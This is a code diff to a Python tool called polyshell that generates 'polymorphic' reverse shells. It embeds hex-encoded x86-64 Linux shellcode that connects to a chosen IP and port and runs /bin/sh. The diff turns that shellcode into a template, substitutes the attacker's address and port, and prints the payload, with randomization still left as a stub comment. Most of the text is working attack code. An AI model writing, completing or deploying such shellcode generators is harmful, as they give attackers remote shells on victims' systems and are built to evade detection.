@@ -3,6 +3,8 @@ from email.mime import base
 import sys
 import argparse
 from polyshell import dechex
+from polyshell import ipbloc
+from polyshell import portbloc
 
 
 def main():
@@ -13,7 +15,7 @@ def main():
     ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
     .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
     '''
-    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b6010f054989c7b02a4c89ff4831f6be901111124881ee11111111566668231d666a024889e6b2180f054831c04831d2b0214c89ff4831f60f054831c04831d2b0214c89ff48ffc60f054d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d20f05b03c4831ff0f05"
+    baseshell = "4831c04831db4831d24831ff4831f6b02940b70240b601syscall4989c7b02a4c89ff4831f6ip56port666a024889e6b218syscall4831c04831d2b0214c89ff4831f6syscall4831c04831d2b0214c89ff48ffc6syscall4d31ff4d31f64831ff4831f64831c0415749bf2f2f62696e2f736841574889e74156574889e6b03b4831d2syscallb03c4831ffsyscall"
     print(banner)
     parser = argparse.ArgumentParser(description='Tool to create polymorphique reverse shell')
     parser.add_argument('-i', '--ip', dest='ip', help='IPv4 Address')
@@ -26,7 +28,20 @@ def main():
         sys.exit(1)
 
     iphex = dechex.iphex(args.ip, args.endianness)
+    porthex = dechex.porthex(args.port,args.endianness)
+
     if iphex:
+        temp = str()
+
+        temp = ipbloc.ipbloc(iphex)
+        baseshell = baseshell.replace("ip",temp)
+
+        temp = portbloc.portbloc(porthex)
+        baseshell = baseshell.replace("port",temp)
+
+        # function randomize : 
+        # function shellcode
+        print(baseshell)
         pass
     else:
         parser.print_help()
